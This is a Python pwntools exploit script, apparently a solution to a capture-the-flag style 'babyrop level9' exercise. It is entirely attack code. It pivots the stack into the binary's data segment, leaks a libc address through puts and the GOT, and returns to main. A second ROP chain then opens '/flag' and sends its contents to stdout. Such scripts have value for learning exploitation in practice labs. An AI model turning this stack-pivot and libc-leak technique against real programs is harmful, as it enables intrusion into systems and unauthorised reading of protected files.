#!/usr/bin/env python3

from pwn import *

# Create a process
p = process("/babyrop_level9_testing1")
#p = process(["strace", "-o", "trace.out", "/babyrop_level9_testing1"])

# Create an ELF and a ROP object
context.binary = elf = ELF("/babyrop_level9_testing1")
rop = ROP(elf)

# Stack Pivoting
# Make the rbp register point to data segment instead of stack segment
rop(rsp=elf.symbols['input'] + 0x10, rbp=elf.symbols['input'] + 0x10 + 8 * 128)

# Another verbose way to do stack pivoting (except rbp)
#rop.raw(rop.find_gadget(['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret']))
#rop.raw(elf.symbols['input'] + 0x10)
#rop.raw(0)  # r13
#rop.raw(0)  # r14
#rop.raw(0)  # r15

# Padding to make sure that the return address of read function is not overwritten by the input buffer.
for i in range(100):
    rop(rdi=0)

# Leak libc address
rop.puts(elf.got['puts'])

# Return to read function call in main
rop.raw(elf.symbols['main'] + 0x4a)
#print(rop.dump())

# Send and receive data
p.sendline(rop.chain())
p.recvuntil(b"Exiting!\n")

# Get libc puts address
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = int.from_bytes(p.recvline().strip(), "little") - libc.symbols['puts']
log.info("libc address: " + hex(libc.address))

# Create a new ROP object
rop = ROP([elf, libc])

# Stack Pivoting
# Exactly the same as before
rop(rsp=elf.symbols['input'] + 0x10, rbp=elf.symbols['input'] + 0x10 + 8 * 128)

# ROP
rop.open(b"/flag", 0)
rop.sendfile(1, 3, 0, 400)
#print(rop.dump(elf.symbols['input']))

# Send and receive data
p.sendline(rop.chain(elf.symbols['input']))
p.recvuntil(b"Exiting!\n")
print(p.recvline())
